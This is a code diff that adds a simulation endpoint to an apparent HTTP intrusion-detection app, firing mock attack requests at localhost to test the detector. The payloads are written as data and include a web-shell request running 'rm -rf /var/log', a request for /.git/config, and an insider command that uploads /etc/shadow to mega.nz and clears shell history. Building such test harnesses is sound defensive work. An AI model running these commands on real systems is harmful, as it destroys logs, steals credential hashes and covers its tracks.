@@ -152,6 +152,69 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                 pass
         return past_events[::-1]
 
+    import httpx
+    @app.post("/api/simulate")
+    async def run_simulation(request: Request):
+        payload = await request.json()
+        scenario = payload.get("scenario")
+        role = payload.get("role", "developer")
+        user_id = payload.get("user_id", "dev_01")
+        
+        async with httpx.AsyncClient() as client:
+            headers = {}
+            if scenario == "normal_user":
+                headers = {"x-mock-ip": "84.22.12.19"}
+                try:
+                    await client.get("http://127.0.0.1/normal_path", headers=headers)
+                except Exception:
+                    pass
+            elif scenario == "external_recon":
+                headers = {"x-mock-ip": "198.51.100.42"}
+                try:
+                    await client.get("http://127.0.0.1/.git/config", headers=headers)
+                except Exception:
+                    pass
+            elif scenario == "external_destructive":
+                headers = {"x-mock-ip": "203.0.113.111"}
+                try:
+                    await client.get("http://127.0.0.1/admin/shell?cmd=rm+-rf+/var/log", headers=headers)
+                except Exception:
+                    pass
+            elif scenario == "insider_normal":
+                headers = {
+                    "x-mock-ip": "192.168.1.75",
+                    "x-user-id": user_id,
+                    "x-user-role": role
+                }
+                try:
+                    await client.post("http://127.0.0.1/normal_path", headers=headers)
+                except Exception:
+                    pass
+            elif scenario == "insider_recon":
+                headers = {
+                    "x-mock-ip": "192.168.1.75",
+                    "x-user-id": user_id,
+                    "x-user-role": role
+                }
+                try:
+                    await client.post("http://127.0.0.1/hr/employees.csv", headers=headers)
+                except Exception:
+                    pass
+            elif scenario == "insider_sabotage":
+                headers = {
+                    "x-mock-ip": "192.168.1.75",
+                    "x-user-id": user_id,
+                    "x-user-role": role
+                }
+                try:
+                    await client.post("http://127.0.0.1/etc/shadow", headers=headers, json={
+                        "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
+                        "cloud_upload": True
+                    })
+                except Exception:
+                    pass
+        return {"status": "simulation_fired"}
+
     from fastapi.responses import HTMLResponse
     @app.get("/dashboard", response_class=HTMLResponse)
     async def get_dashboard():
